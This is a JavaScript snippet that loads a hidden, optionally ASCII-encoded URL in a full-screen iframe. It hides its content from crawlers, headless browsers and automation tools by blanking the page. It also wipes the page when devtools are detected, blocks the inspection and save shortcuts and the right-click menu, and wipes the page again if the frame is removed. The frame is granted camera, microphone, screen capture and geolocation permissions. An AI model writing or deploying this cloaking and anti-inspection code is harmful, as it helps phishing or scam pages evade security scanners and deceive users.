(function () {
  'use strict';

  // =========================================================================
  // CONFIGURATION & TARGET URL CONFIG
  // =========================================================================

  // Set to 'A' for Direct URL, or 'B' for Encoded ASCII URL
  const USE_OPTION = 'A';

  // OPTION A: Direct URL string
  const DIRECT_URL = 'https://example.com';

  // OPTION B: ASCII character codes array
  // Default below decodes to "https://example.com"
  // [104='h', 116='t', 116='t', 112='p', 115='s', 58=':', 47='/', 47='/', ...]
  const ASCII_CODES = [104, 116, 116, 112, 115, 58, 47, 47, 101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109];

  // Dynamically resolve target URL based on selected option
  const getTarget = () => {
    if (USE_OPTION === 'B') {
      return String.fromCharCode.apply(null, ASCII_CODES);
    }
    return DIRECT_URL;
  };

  // =========================================================================
  // 1. SCRAPER & AUTOMATION DETECTION
  // =========================================================================
  const isAutomated = () => {
    const ua = navigator.userAgent.toLowerCase();
    
    // Check known crawler user agents
    if (/bot|googlebot|crawler|spider|robot|crawling|slurp|bingbot|yandex|baidu|headless|phantom|selenium|puppeteer/i.test(ua)) {
      return true;
    }

    // Check automation / webdriver environment flags
    if (navigator.webdriver || !!window.callPhantom || !!window._phantom || !!window.__nightmare) {
      return true;
    }

    // Chrome headless specific checks
    if (window.chrome && !window.chrome.runtime) {
      if (ua.includes('headlesschrome')) return true;
    }

    // Missing languages array (typical for default headless instances)
    if (!navigator.languages || navigator.languages.length === 0) {
      return true;
    }

    return false;
  };

  if (isAutomated()) {
    document.documentElement.innerHTML = '';
    return;
  }

  // =========================================================================
  // 2. DEVTOOLS INTERFERENCE TRAP
  // =========================================================================
  const startDevToolsBlocker = () => {
    const freeze = () => {
      const startTime = performance.now();
      // Breakpoint triggers when developer tools are active
      (function () {}.constructor('debugger')());
      const endTime = performance.now();
      
      // If timing gap exceeds threshold, execution was paused -> wipe page
      if (endTime - startTime > 100) {
        document.body.innerHTML = '';
        window.location.reload();
      }
    };
    setInterval(freeze, 200);
  };

  // =========================================================================
  // 3. UI LOCKOUT (KEYBOARD & CONTEXT MENU)
  // =========================================================================
  const lockInteractions = () => {
    window.addEventListener('keydown', (e) => {
      // Block F12 key
      if (e.keyCode === 123) e.preventDefault();

      // Block Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U, Ctrl+S
      if (e.ctrlKey || e.metaKey) {
        const key = e.key.toLowerCase();
        if (key === 'u' || key === 's' || key === 'i' || key === 'j' || key === 'c') {
          e.preventDefault();
          e.stopPropagation();
        }
      }
    }, true);

    window.addEventListener('contextmenu', (e) => e.preventDefault(), true);
  };

  // =========================================================================
  // 4. CONSTRUCT FULLSCREEN IFRAME
  // =========================================================================
  const buildSecureFrame = () => {
    const iframe = document.createElement('iframe');
    
    iframe.src = getTarget();

    // Absolute positioning covering the viewport completely
    Object.assign(iframe.style, {
      position: 'fixed',
      top: '0px',
      left: '0px',
      width: '100vw',
      height: '100vh',
      border: 'none',
      outline: 'none',
      zIndex: '2147483647',
      background: '#000'
    });

    // Cross-vendor fullscreen attributes
    iframe.setAttribute('allowfullscreen', 'true');
    iframe.setAttribute('webkitallowfullscreen', 'true');
    iframe.setAttribute('mozallowfullscreen', 'true');

    // Permissions policy for hardware, media, and fullscreen
    iframe.setAttribute(
      'allow',
      'fullscreen; autoplay; clipboard-write; encrypted-media; picture-in-picture; camera; microphone; display-capture; geolocation'
    );

    // Permissive sandbox parameters
    iframe.setAttribute(
      'sandbox',
      'allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-downloads allow-orientation-lock allow-pointer-lock allow-presentation allow-top-navigation'
    );

    return iframe;
  };

  // =========================================================================
  // 5. DOM TAMPER PROTECTION
  // =========================================================================
  const attachTamperObserver = (targetNode) => {
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.type === 'childList') {
          const removed = Array.from(mutation.removedNodes);
          if (removed.includes(targetNode)) {
            document.documentElement.innerHTML = '';
          }
        }
      }
    });

    observer.observe(document.body, { childList: true, subtree: true });
  };

  // =========================================================================
  // 6. INITIALIZATION
  // =========================================================================
  const init = () => {
    lockInteractions();
    startDevToolsBlocker();

    const frame = buildSecureFrame();
    document.body.appendChild(frame);
    attachTamperObserver(frame);
  };

  if (document.body) {
    init();
  } else {
    document.addEventListener('DOMContentLoaded', init);
  }
})();
